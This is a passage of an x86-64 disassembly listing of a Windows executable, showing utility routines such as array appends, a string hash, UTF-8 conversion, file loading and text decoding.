   140002ecf:	0f 10 44 24 20       	movups 0x20(%rsp),%xmm0
   140002ed4:	f2 0f 10 4c 24 30    	movsd  0x30(%rsp),%xmm1
   140002eda:	48 6b c8 1c          	imul   $0x1c,%rax,%rcx
   140002ede:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140002ee2:	0f 11 04 01          	movups %xmm0,(%rcx,%rax,1)
   140002ee6:	f2 0f 11 4c 01 10    	movsd  %xmm1,0x10(%rcx,%rax,1)
   140002eec:	44 89 74 01 18       	mov    %r14d,0x18(%rcx,%rax,1)
   140002ef1:	ff 03                	incl   (%rbx)
   140002ef3:	4c 8b 74 24 68       	mov    0x68(%rsp),%r14
   140002ef8:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140002efd:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140002f02:	48 8b 7c 24 60       	mov    0x60(%rsp),%rdi
   140002f07:	48 83 c4 40          	add    $0x40,%rsp
   140002f0b:	5e                   	pop    %rsi
   140002f0c:	c3                   	ret
   140002f0d:	cc                   	int3
   140002f0e:	cc                   	int3
   140002f0f:	cc                   	int3
   140002f10:	48 83 ec 48          	sub    $0x48,%rsp
   140002f14:	80 b9 a9 37 00 00 00 	cmpb   $0x0,0x37a9(%rcx)
   140002f1b:	48 8b 91 f0 0d 00 00 	mov    0xdf0(%rcx),%rdx
   140002f22:	0f 84 5a 01 00 00    	je     0x140003082
   140002f28:	f3 0f 10 1d d4 53 04 	movss  0x453d4(%rip),%xmm3        # 0x140048304
   140002f2f:	00 
   140002f30:	0f 57 e4             	xorps  %xmm4,%xmm4
   140002f33:	0f 2f d3             	comiss %xmm3,%xmm2
   140002f36:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   140002f3b:	76 20                	jbe    0x140002f5d
   140002f3d:	0f 2f d4             	comiss %xmm4,%xmm2
   140002f40:	f3 0f 2c c2          	cvttss2si %xmm2,%eax
   140002f44:	73 10                	jae    0x140002f56
   140002f46:	66 0f 6e c0          	movd   %eax,%xmm0
   140002f4a:	0f 5b c0             	cvtdq2ps %xmm0,%xmm0
   140002f4d:	0f 2e c2             	ucomiss %xmm2,%xmm0
   140002f50:	7a 02                	jp     0x140002f54
   140002f52:	74 02                	je     0x140002f56
   140002f54:	ff c8                	dec    %eax
   140002f56:	66 0f 6e d0          	movd   %eax,%xmm2
   140002f5a:	0f 5b d2             	cvtdq2ps %xmm2,%xmm2
   140002f5d:	0f 2f cb             	comiss %xmm3,%xmm1
   140002f60:	76 20                	jbe    0x140002f82
   140002f62:	0f 2f cc             	comiss %xmm4,%xmm1
   140002f65:	f3 0f 2c c1          	cvttss2si %xmm1,%eax
   140002f69:	73 10                	jae    0x140002f7b
   140002f6b:	66 0f 6e c0          	movd   %eax,%xmm0
   140002f6f:	0f 5b c0             	cvtdq2ps %xmm0,%xmm0
   140002f72:	0f 2e c1             	ucomiss %xmm1,%xmm0
   140002f75:	7a 02                	jp     0x140002f79
   140002f77:	74 02                	je     0x140002f7b
   140002f79:	ff c8                	dec    %eax
   140002f7b:	66 0f 6e c8          	movd   %eax,%xmm1
   140002f7f:	0f 5b c9             	cvtdq2ps %xmm1,%xmm1
   140002f82:	48 8d 9a 50 3e 00 00 	lea    0x3e50(%rdx),%rbx
   140002f89:	44 8b 0b             	mov    (%rbx),%r9d
   140002f8c:	41 8d 41 ff          	lea    -0x1(%r9),%eax
   140002f90:	85 c0                	test   %eax,%eax
   140002f92:	78 21                	js     0x140002fb5
   140002f94:	48 63 c8             	movslq %eax,%rcx
   140002f97:	48 6b c1 1c          	imul   $0x1c,%rcx,%rax
   140002f9b:	48 03 82 58 3e 00 00 	add    0x3e58(%rdx),%rax
   140002fa2:	83 38 01             	cmpl   $0x1,(%rax)
   140002fa5:	0f 84 83 00 00 00    	je     0x14000302e
   140002fab:	48 83 e8 1c          	sub    $0x1c,%rax
   140002faf:	48 83 e9 01          	sub    $0x1,%rcx
   140002fb3:	79 ed                	jns    0x140002fa2
   140002fb5:	f3 0f 10 82 00 0e 00 	movss  0xe00(%rdx),%xmm0
   140002fbc:	00 
   140002fbd:	f3 0f 10 9a 04 0e 00 	movss  0xe04(%rdx),%xmm3
   140002fc4:	00 
   140002fc5:	0f 2e c1             	ucomiss %xmm1,%xmm0
   140002fc8:	7a 0d                	jp     0x140002fd7
   140002fca:	75 0b                	jne    0x140002fd7
   140002fcc:	0f 2e da             	ucomiss %xmm2,%xmm3
   140002fcf:	7a 06                	jp     0x140002fd7
   140002fd1:	0f 84 a6 00 00 00    	je     0x14000307d
   140002fd7:	8b 82 74 3e 00 00    	mov    0x3e74(%rdx),%eax
   140002fdd:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140002fe1:	ff c0                	inc    %eax
   140002fe3:	89 82 74 3e 00 00    	mov    %eax,0x3e74(%rdx)
   140002fe9:	44 8b 43 04          	mov    0x4(%rbx),%r8d
   140002fed:	8b 82 70 3e 00 00    	mov    0x3e70(%rdx),%eax
   140002ff3:	f3 0f 11 4c 24 2c    	movss  %xmm1,0x2c(%rsp)
   140002ff9:	f3 0f 11 54 24 30    	movss  %xmm2,0x30(%rsp)
   140002fff:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
   140003006:	00 
   140003007:	c7 44 24 24 01 00 00 	movl   $0x1,0x24(%rsp)
   14000300e:	00 
   14000300f:	89 44 24 34          	mov    %eax,0x34(%rsp)
   140003013:	45 3b c8             	cmp    %r8d,%r9d
   140003016:	75 3b                	jne    0x140003053
   140003018:	41 8d 49 01          	lea    0x1(%r9),%ecx
   14000301c:	45 85 c0             	test   %r8d,%r8d
   14000301f:	74 1e                	je     0x14000303f
   140003021:	41 8b c0             	mov    %r8d,%eax
   140003024:	99                   	cltd
   140003025:	2b c2                	sub    %edx,%eax
   140003027:	d1 f8                	sar    $1,%eax
   140003029:	41 03 c0             	add    %r8d,%eax
   14000302c:	eb 16                	jmp    0x140003044
   14000302e:	48 85 c0             	test   %rax,%rax
   140003031:	74 82                	je     0x140002fb5
   140003033:	f3 0f 10 40 0c       	movss  0xc(%rax),%xmm0
   140003038:	f3 0f 10 58 10       	movss  0x10(%rax),%xmm3
   14000303d:	eb 86                	jmp    0x140002fc5
   14000303f:	b8 08 00 00 00       	mov    $0x8,%eax
   140003044:	3b c1                	cmp    %ecx,%eax
   140003046:	0f 4f c8             	cmovg  %eax,%ecx
   140003049:	8b d1                	mov    %ecx,%edx
   14000304b:	48 8b cb             	mov    %rbx,%rcx
   14000304e:	e8 cd 88 01 00       	call   0x14001b920
   140003053:	48 63 03             	movslq (%rbx),%rax
   140003056:	0f 10 44 24 20       	movups 0x20(%rsp),%xmm0
   14000305b:	f2 0f 10 4c 24 30    	movsd  0x30(%rsp),%xmm1
   140003061:	48 6b c8 1c          	imul   $0x1c,%rax,%rcx
   140003065:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140003069:	0f 11 04 01          	movups %xmm0,(%rcx,%rax,1)
   14000306d:	f2 0f 11 4c 01 10    	movsd  %xmm1,0x10(%rcx,%rax,1)
   140003073:	c7 44 01 18 00 00 00 	movl   $0x0,0x18(%rcx,%rax,1)
   14000307a:	00 
   14000307b:	ff 03                	incl   (%rbx)
   14000307d:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140003082:	48 83 c4 48          	add    $0x48,%rsp
   140003086:	c3                   	ret
   140003087:	cc                   	int3
   140003088:	cc                   	int3
   140003089:	cc                   	int3
   14000308a:	cc                   	int3
   14000308b:	cc                   	int3
   14000308c:	cc                   	int3
   14000308d:	cc                   	int3
   14000308e:	cc                   	int3
   14000308f:	cc                   	int3
   140003090:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140003095:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000309a:	53                   	push   %rbx
   14000309b:	55                   	push   %rbp
   14000309c:	56                   	push   %rsi
   14000309d:	57                   	push   %rdi
   14000309e:	48 83 ec 38          	sub    $0x38,%rsp
   1400030a2:	49 8b d8             	mov    %r8,%rbx
   1400030a5:	48 8d 6c 24 78       	lea    0x78(%rsp),%rbp
   1400030aa:	48 8b fa             	mov    %rdx,%rdi
   1400030ad:	48 8b f1             	mov    %rcx,%rsi
   1400030b0:	e8 fb e1 ff ff       	call   0x1400012b0
   1400030b5:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
   1400030ba:	4c 8b cb             	mov    %rbx,%r9
   1400030bd:	4c 8b c7             	mov    %rdi,%r8
   1400030c0:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400030c7:	00 00 
   1400030c9:	48 8b d6             	mov    %rsi,%rdx
   1400030cc:	48 8b 08             	mov    (%rax),%rcx
   1400030cf:	48 83 c9 01          	or     $0x1,%rcx
   1400030d3:	ff 15 af e4 03 00    	call   *0x3e4af(%rip)        # 0x140041588
   1400030d9:	8b c8                	mov    %eax,%ecx
   1400030db:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400030e0:	85 c9                	test   %ecx,%ecx
   1400030e2:	0f 48 c8             	cmovs  %eax,%ecx
   1400030e5:	48 85 f6             	test   %rsi,%rsi
   1400030e8:	74 12                	je     0x1400030fc
   1400030ea:	3b c8                	cmp    %eax,%ecx
   1400030ec:	74 04                	je     0x1400030f2
   1400030ee:	3b cf                	cmp    %edi,%ecx
   1400030f0:	7c 03                	jl     0x1400030f5
   1400030f2:	8d 4f ff             	lea    -0x1(%rdi),%ecx
   1400030f5:	48 63 c1             	movslq %ecx,%rax
   1400030f8:	c6 04 30 00          	movb   $0x0,(%rax,%rsi,1)
   1400030fc:	8b c1                	mov    %ecx,%eax
   1400030fe:	48 83 c4 38          	add    $0x38,%rsp
   140003102:	5f                   	pop    %rdi
   140003103:	5e                   	pop    %rsi
   140003104:	5d                   	pop    %rbp
   140003105:	5b                   	pop    %rbx
   140003106:	c3                   	ret
   140003107:	cc                   	int3
   140003108:	cc                   	int3
   140003109:	cc                   	int3
   14000310a:	cc                   	int3
   14000310b:	cc                   	int3
   14000310c:	cc                   	int3
   14000310d:	cc                   	int3
   14000310e:	cc                   	int3
   14000310f:	cc                   	int3
   140003110:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140003115:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000311a:	55                   	push   %rbp
   14000311b:	56                   	push   %rsi
   14000311c:	57                   	push   %rdi
   14000311d:	41 55                	push   %r13
   14000311f:	41 56                	push   %r14
   140003121:	48 83 ec 50          	sub    $0x50,%rsp
   140003125:	41 80 38 25          	cmpb   $0x25,(%r8)
   140003129:	4c 8d ac 24 98 00 00 	lea    0x98(%rsp),%r13
   140003130:	00 
   140003131:	48 8b 2d c8 c6 04 00 	mov    0x4c6c8(%rip),%rbp        # 0x14004f800
   140003138:	49 8b f8             	mov    %r8,%rdi
   14000313b:	48 8b f2             	mov    %rdx,%rsi
   14000313e:	4c 8b f1             	mov    %rcx,%r14
   140003141:	75 48                	jne    0x14000318b
   140003143:	41 80 78 01 73       	cmpb   $0x73,0x1(%r8)
   140003148:	75 41                	jne    0x14000318b
   14000314a:	41 80 78 02 00       	cmpb   $0x0,0x2(%r8)
   14000314f:	75 3a                	jne    0x14000318b
   140003151:	49 8b 4d 00          	mov    0x0(%r13),%rcx
   140003155:	49 89 0e             	mov    %rcx,(%r14)
   140003158:	48 85 d2             	test   %rdx,%rdx
   14000315b:	0f 84 c3 00 00 00    	je     0x140003224
   140003161:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   140003168:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000316f:	00 
   140003170:	48 ff c0             	inc    %rax
   140003173:	80 3c 01 00          	cmpb   $0x0,(%rcx,%rax,1)
   140003177:	75 f7                	jne    0x140003170
   140003179:	48 03 c8             	add    %rax,%rcx
   14000317c:	48 89 0a             	mov    %rcx,(%rdx)
   14000317f:	48 83 c4 50          	add    $0x50,%rsp
   140003183:	41 5e                	pop    %r14
   140003185:	41 5d                	pop    %r13
   140003187:	5f                   	pop    %rdi
   140003188:	5e                   	pop    %rsi
   140003189:	5d                   	pop    %rbp
   14000318a:	c3                   	ret
   14000318b:	48 89 5c 24 48       	mov    %rbx,0x48(%rsp)
   140003190:	4c 89 64 24 40       	mov    %r12,0x40(%rsp)
   140003195:	4c 8b a5 60 5e 00 00 	mov    0x5e60(%rbp),%r12
   14000319c:	4c 89 7c 24 38       	mov    %r15,0x38(%rsp)
   1400031a1:	4c 63 bd 58 5e 00 00 	movslq 0x5e58(%rbp),%r15
   1400031a8:	e8 03 e1 ff ff       	call   0x1400012b0
   1400031ad:	4c 89 6c 24 28       	mov    %r13,0x28(%rsp)
   1400031b2:	4c 8b cf             	mov    %rdi,%r9
   1400031b5:	4d 8b c7             	mov    %r15,%r8
   1400031b8:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400031bf:	00 00 
   1400031c1:	49 8b d4             	mov    %r12,%rdx
   1400031c4:	48 8b 08             	mov    (%rax),%rcx
   1400031c7:	48 83 c9 01          	or     $0x1,%rcx
   1400031cb:	ff 15 b7 e3 03 00    	call   *0x3e3b7(%rip)        # 0x140041588
   1400031d1:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   1400031d6:	8b c8                	mov    %eax,%ecx
   1400031d8:	85 c9                	test   %ecx,%ecx
   1400031da:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   1400031e1:	0f 48 c8             	cmovs  %eax,%ecx
   1400031e4:	4d 85 e4             	test   %r12,%r12
   1400031e7:	74 15                	je     0x1400031fe
   1400031e9:	3b c8                	cmp    %eax,%ecx
   1400031eb:	74 05                	je     0x1400031f2
   1400031ed:	41 3b cf             	cmp    %r15d,%ecx
   1400031f0:	7c 04                	jl     0x1400031f6
   1400031f2:	41 8d 4f ff          	lea    -0x1(%r15),%ecx
   1400031f6:	48 63 c1             	movslq %ecx,%rax
   1400031f9:	42 c6 04 20 00       	movb   $0x0,(%rax,%r12,1)
   1400031fe:	48 8b 85 60 5e 00 00 	mov    0x5e60(%rbp),%rax
   140003205:	4c 8b 7c 24 38       	mov    0x38(%rsp),%r15
   14000320a:	4c 8b 64 24 40       	mov    0x40(%rsp),%r12
   14000320f:	49 89 06             	mov    %rax,(%r14)
   140003212:	48 85 f6             	test   %rsi,%rsi
   140003215:	74 0d                	je     0x140003224
   140003217:	48 63 c1             	movslq %ecx,%rax
   14000321a:	48 03 85 60 5e 00 00 	add    0x5e60(%rbp),%rax
   140003221:	48 89 06             	mov    %rax,(%rsi)
   140003224:	48 83 c4 50          	add    $0x50,%rsp
   140003228:	41 5e                	pop    %r14
   14000322a:	41 5d                	pop    %r13
   14000322c:	5f                   	pop    %rdi
   14000322d:	5e                   	pop    %rsi
   14000322e:	5d                   	pop    %rbp
   14000322f:	c3                   	ret
   140003230:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003235:	45 8b d8             	mov    %r8d,%r11d
   140003238:	4c 8b d2             	mov    %rdx,%r10
   14000323b:	41 f7 d3             	not    %r11d
   14000323e:	4c 8b c9             	mov    %rcx,%r9
   140003241:	41 8b c3             	mov    %r11d,%eax
   140003244:	48 85 d2             	test   %rdx,%rdx
   140003247:	74 44                	je     0x14000328d
   140003249:	48 8d 1d 40 f9 03 00 	lea    0x3f940(%rip),%rbx        # 0x140042b90
   140003250:	45 0f b6 01          	movzbl (%r9),%r8d
   140003254:	4d 8d 49 01          	lea    0x1(%r9),%r9
   140003258:	49 ff ca             	dec    %r10
   14000325b:	41 80 f8 23          	cmp    $0x23,%r8b
   14000325f:	75 13                	jne    0x140003274
   140003261:	49 83 fa 02          	cmp    $0x2,%r10
   140003265:	72 0d                	jb     0x140003274
   140003267:	45 38 01             	cmp    %r8b,(%r9)
   14000326a:	75 08                	jne    0x140003274
   14000326c:	45 38 41 01          	cmp    %r8b,0x1(%r9)
   140003270:	41 0f 44 c3          	cmove  %r11d,%eax
   140003274:	0f b6 d0             	movzbl %al,%edx
   140003277:	49 33 d0             	xor    %r8,%rdx
   14000327a:	c1 e8 08             	shr    $0x8,%eax
   14000327d:	33 04 93             	xor    (%rbx,%rdx,4),%eax
   140003280:	4d 85 d2             	test   %r10,%r10
   140003283:	75 cb                	jne    0x140003250
   140003285:	f7 d0                	not    %eax
   140003287:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   14000328c:	c3                   	ret
   14000328d:	44 0f b6 11          	movzbl (%rcx),%r10d
   140003291:	4c 8d 41 01          	lea    0x1(%rcx),%r8
   140003295:	45 84 d2             	test   %r10b,%r10b
   140003298:	74 36                	je     0x1400032d0
   14000329a:	48 8d 1d ef f8 03 00 	lea    0x3f8ef(%rip),%rbx        # 0x140042b90
   1400032a1:	41 80 fa 23          	cmp    $0x23,%r10b
   1400032a5:	75 0d                	jne    0x1400032b4
   1400032a7:	45 38 10             	cmp    %r10b,(%r8)
   1400032aa:	75 08                	jne    0x1400032b4
   1400032ac:	45 38 50 01          	cmp    %r10b,0x1(%r8)
   1400032b0:	41 0f 44 c3          	cmove  %r11d,%eax
   1400032b4:	0f b6 d0             	movzbl %al,%edx
   1400032b7:	41 0f b6 ca          	movzbl %r10b,%ecx
   1400032bb:	45 0f b6 10          	movzbl (%r8),%r10d
   1400032bf:	48 33 d1             	xor    %rcx,%rdx
   1400032c2:	c1 e8 08             	shr    $0x8,%eax
   1400032c5:	49 ff c0             	inc    %r8
   1400032c8:	33 04 93             	xor    (%rbx,%rdx,4),%eax
   1400032cb:	45 84 d2             	test   %r10b,%r10b
   1400032ce:	75 d1                	jne    0x1400032a1
   1400032d0:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   1400032d5:	f7 d0                	not    %eax
   1400032d7:	c3                   	ret
   1400032d8:	cc                   	int3
   1400032d9:	cc                   	int3
   1400032da:	cc                   	int3
   1400032db:	cc                   	int3
   1400032dc:	cc                   	int3
   1400032dd:	cc                   	int3
   1400032de:	cc                   	int3
   1400032df:	cc                   	int3
   1400032e0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400032e5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400032ea:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400032ef:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400032f4:	41 56                	push   %r14
   1400032f6:	48 83 ec 40          	sub    $0x40,%rsp
   1400032fa:	48 8b f2             	mov    %rdx,%rsi
   1400032fd:	48 8b e9             	mov    %rcx,%rbp
   140003300:	33 ff                	xor    %edi,%edi
   140003302:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   140003306:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000330b:	41 b9 ff ff ff ff    	mov    $0xffffffff,%r9d
   140003311:	4c 8b c1             	mov    %rcx,%r8
   140003314:	33 d2                	xor    %edx,%edx
   140003316:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
   14000331b:	ff 15 5f de 03 00    	call   *0x3de5f(%rip)        # 0x140041180
   140003321:	48 63 d8             	movslq %eax,%rbx
   140003324:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   140003328:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000332d:	41 b9 ff ff ff ff    	mov    $0xffffffff,%r9d
   140003333:	4c 8b c6             	mov    %rsi,%r8
   140003336:	33 d2                	xor    %edx,%edx
   140003338:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
   14000333d:	ff 15 3d de 03 00    	call   *0x3de3d(%rip)        # 0x140041180
   140003343:	44 8b f0             	mov    %eax,%r14d
   140003346:	8d 0c 18             	lea    (%rax,%rbx,1),%ecx
   140003349:	85 c9                	test   %ecx,%ecx
   14000334b:	7e 2f                	jle    0x14000337c
   14000334d:	b8 08 00 00 00       	mov    $0x8,%eax
   140003352:	3b c8                	cmp    %eax,%ecx
   140003354:	0f 4c c8             	cmovl  %eax,%ecx
   140003357:	85 c9                	test   %ecx,%ecx
   140003359:	7e 21                	jle    0x14000337c
   14000335b:	48 8b 05 9e c4 04 00 	mov    0x4c49e(%rip),%rax        # 0x14004f800
   140003362:	48 85 c0             	test   %rax,%rax
   140003365:	74 06                	je     0x14000336d
   140003367:	ff 80 ec 00 00 00    	incl   0xec(%rax)
   14000336d:	48 63 c9             	movslq %ecx,%rcx
   140003370:	48 03 c9             	add    %rcx,%rcx
   140003373:	ff 15 97 e0 03 00    	call   *0x3e097(%rip)        # 0x140041410
   140003379:	48 8b f8             	mov    %rax,%rdi
   14000337c:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140003380:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140003385:	41 b9 ff ff ff ff    	mov    $0xffffffff,%r9d
   14000338b:	4c 8b c5             	mov    %rbp,%r8
   14000338e:	33 d2                	xor    %edx,%edx
   140003390:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
   140003395:	ff 15 e5 dd 03 00    	call   *0x3dde5(%rip)        # 0x140041180
   14000339b:	48 8d 1c 5f          	lea    (%rdi,%rbx,2),%rbx
   14000339f:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   1400033a4:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400033a9:	41 b9 ff ff ff ff    	mov    $0xffffffff,%r9d
   1400033af:	4c 8b c6             	mov    %rsi,%r8
   1400033b2:	33 d2                	xor    %edx,%edx
   1400033b4:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
   1400033b9:	ff 15 c1 dd 03 00    	call   *0x3ddc1(%rip)        # 0x140041180
   1400033bf:	48 8b d3             	mov    %rbx,%rdx
   1400033c2:	48 8b cf             	mov    %rdi,%rcx
   1400033c5:	ff 15 c5 e1 03 00    	call   *0x3e1c5(%rip)        # 0x140041590
   1400033cb:	48 8b d8             	mov    %rax,%rbx
   1400033ce:	48 85 ff             	test   %rdi,%rdi
   1400033d1:	74 21                	je     0x1400033f4
   1400033d3:	48 8b 0d 26 c4 04 00 	mov    0x4c426(%rip),%rcx        # 0x14004f800
   1400033da:	48 85 c9             	test   %rcx,%rcx
   1400033dd:	74 06                	je     0x1400033e5
   1400033df:	ff 89 ec 00 00 00    	decl   0xec(%rcx)
   1400033e5:	48 8b cf             	mov    %rdi,%rcx
   1400033e8:	ff 15 12 e0 03 00    	call   *0x3e012(%rip)        # 0x140041400
   1400033ee:	90                   	nop
   1400033ef:	48 8b c3             	mov    %rbx,%rax
   1400033f2:	eb 00                	jmp    0x1400033f4
   1400033f4:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1400033f9:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   1400033fe:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140003403:	48 8b 7c 24 68       	mov    0x68(%rsp),%rdi
   140003408:	48 83 c4 40          	add    $0x40,%rsp
   14000340c:	41 5e                	pop    %r14
   14000340e:	c3                   	ret
   14000340f:	cc                   	int3
   140003410:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140003415:	41 56                	push   %r14
   140003417:	48 83 ec 20          	sub    $0x20,%rsp
   14000341b:	4d 8b f0             	mov    %r8,%r14
   14000341e:	4d 85 c0             	test   %r8,%r8
   140003421:	74 07                	je     0x14000342a
   140003423:	49 c7 00 00 00 00 00 	movq   $0x0,(%r8)
   14000342a:	48 8d 15 bf f2 03 00 	lea    0x3f2bf(%rip),%rdx        # 0x1400426f0
   140003431:	e8 aa fe ff ff       	call   0x1400032e0
   140003436:	48 8b d8             	mov    %rax,%rbx
   140003439:	48 85 c0             	test   %rax,%rax
   14000343c:	75 0c                	jne    0x14000344a
   14000343e:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140003443:	48 83 c4 20          	add    $0x20,%rsp
   140003447:	41 5e                	pop    %r14
   140003449:	c3                   	ret
   14000344a:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   14000344f:	48 8b cb             	mov    %rbx,%rcx
   140003452:	48 89 7c 24 38       	mov    %rdi,0x38(%rsp)
   140003457:	ff 15 e3 e0 03 00    	call   *0x3e0e3(%rip)        # 0x140041540
   14000345d:	8b f0                	mov    %eax,%esi
   14000345f:	83 f8 ff             	cmp    $0xffffffff,%eax
   140003462:	0f 84 bb 00 00 00    	je     0x140003523
   140003468:	33 d2                	xor    %edx,%edx
   14000346a:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140003470:	48 8b cb             	mov    %rbx,%rcx
   140003473:	ff 15 f7 e0 03 00    	call   *0x3e0f7(%rip)        # 0x140041570
   140003479:	85 c0                	test   %eax,%eax
   14000347b:	0f 85 a2 00 00 00    	jne    0x140003523
   140003481:	48 8b cb             	mov    %rbx,%rcx
   140003484:	ff 15 b6 e0 03 00    	call   *0x3e0b6(%rip)        # 0x140041540
   14000348a:	48 63 f8             	movslq %eax,%rdi
   14000348d:	83 ff ff             	cmp    $0xffffffff,%edi
   140003490:	0f 84 8d 00 00 00    	je     0x140003523
   140003496:	45 33 c0             	xor    %r8d,%r8d
   140003499:	8b d6                	mov    %esi,%edx
   14000349b:	48 8b cb             	mov    %rbx,%rcx
   14000349e:	ff 15 cc e0 03 00    	call   *0x3e0cc(%rip)        # 0x140041570
   1400034a4:	85 c0                	test   %eax,%eax
   1400034a6:	75 7b                	jne    0x140003523
   1400034a8:	48 83 ff ff          	cmp    $0xffffffffffffffff,%rdi
   1400034ac:	74 75                	je     0x140003523
   1400034ae:	48 8b 05 4b c3 04 00 	mov    0x4c34b(%rip),%rax        # 0x14004f800
   1400034b5:	48 85 c0             	test   %rax,%rax
   1400034b8:	74 06                	je     0x1400034c0
   1400034ba:	ff 80 ec 00 00 00    	incl   0xec(%rax)
   1400034c0:	48 8b cf             	mov    %rdi,%rcx
   1400034c3:	ff 15 47 df 03 00    	call   *0x3df47(%rip)        # 0x140041410
   1400034c9:	48 8b f0             	mov    %rax,%rsi
   1400034cc:	48 85 c0             	test   %rax,%rax
   1400034cf:	74 52                	je     0x140003523
   1400034d1:	4c 8b cb             	mov    %rbx,%r9
   1400034d4:	4c 8b c7             	mov    %rdi,%r8
   1400034d7:	ba 01 00 00 00       	mov    $0x1,%edx
   1400034dc:	48 8b c8             	mov    %rax,%rcx
   1400034df:	ff 15 9b e0 03 00    	call   *0x3e09b(%rip)        # 0x140041580
   1400034e5:	48 8b cb             	mov    %rbx,%rcx
   1400034e8:	48 3b c7             	cmp    %rdi,%rax
   1400034eb:	74 23                	je     0x140003510
   1400034ed:	ff 15 75 e0 03 00    	call   *0x3e075(%rip)        # 0x140041568
   1400034f3:	48 8b 05 06 c3 04 00 	mov    0x4c306(%rip),%rax        # 0x14004f800
   1400034fa:	48 85 c0             	test   %rax,%rax
   1400034fd:	74 06                	je     0x140003505
   1400034ff:	ff 88 ec 00 00 00    	decl   0xec(%rax)
   140003505:	48 8b ce             	mov    %rsi,%rcx
   140003508:	ff 15 f2 de 03 00    	call   *0x3def2(%rip)        # 0x140041400
   14000350e:	eb 1c                	jmp    0x14000352c
   140003510:	ff 15 52 e0 03 00    	call   *0x3e052(%rip)        # 0x140041568
   140003516:	4d 85 f6             	test   %r14,%r14
   140003519:	74 03                	je     0x14000351e
   14000351b:	49 89 3e             	mov    %rdi,(%r14)
   14000351e:	48 8b c6             	mov    %rsi,%rax
   140003521:	eb 0b                	jmp    0x14000352e
   140003523:	48 8b cb             	mov    %rbx,%rcx
   140003526:	ff 15 3c e0 03 00    	call   *0x3e03c(%rip)        # 0x140041568
   14000352c:	33 c0                	xor    %eax,%eax
   14000352e:	48 8b 74 24 30       	mov    0x30(%rsp),%rsi
   140003533:	48 8b 7c 24 38       	mov    0x38(%rsp),%rdi
   140003538:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000353d:	48 83 c4 20          	add    $0x20,%rsp
   140003541:	41 5e                	pop    %r14
   140003543:	c3                   	ret
   140003544:	cc                   	int3
   140003545:	cc                   	int3
   140003546:	cc                   	int3
   140003547:	cc                   	int3
   140003548:	cc                   	int3
   140003549:	cc                   	int3
   14000354a:	cc                   	int3
   14000354b:	cc                   	int3
   14000354c:	cc                   	int3
   14000354d:	cc                   	int3
   14000354e:	cc                   	int3
   14000354f:	cc                   	int3
   140003550:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003555:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000355a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000355f:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140003564:	41 54                	push   %r12
   140003566:	41 56                	push   %r14
   140003568:	41 57                	push   %r15
   14000356a:	44 0f b6 0a          	movzbl (%rdx),%r9d
   14000356e:	4c 8d 25 8b ca ff ff 	lea    -0x3575(%rip),%r12        # 0x140000000
   140003575:	33 db                	xor    %ebx,%ebx
   140003577:	41 8b c1             	mov    %r9d,%eax
   14000357a:	48 c1 e8 03          	shr    $0x3,%rax
   14000357e:	44 8b db             	mov    %ebx,%r11d
   140003581:	48 8b f1             	mov    %rcx,%rsi
   140003584:	4e 0f be 94 20 c0 28 	movsbq 0x428c0(%rax,%r12,1),%r10
   14000358b:	04 00 
   14000358d:	45 85 d2             	test   %r10d,%r10d
   140003590:	41 0f 94 c3          	sete   %r11b
   140003594:	45 03 da             	add    %r10d,%r11d
   140003597:	4d 85 c0             	test   %r8,%r8
   14000359a:	75 06                	jne    0x1400035a2
   14000359c:	4d 63 c3             	movslq %r11d,%r8
   14000359f:	4c 03 c2             	add    %rdx,%r8
   1400035a2:	49 3b d0             	cmp    %r8,%rdx
   1400035a5:	48 8d 42 01          	lea    0x1(%rdx),%rax
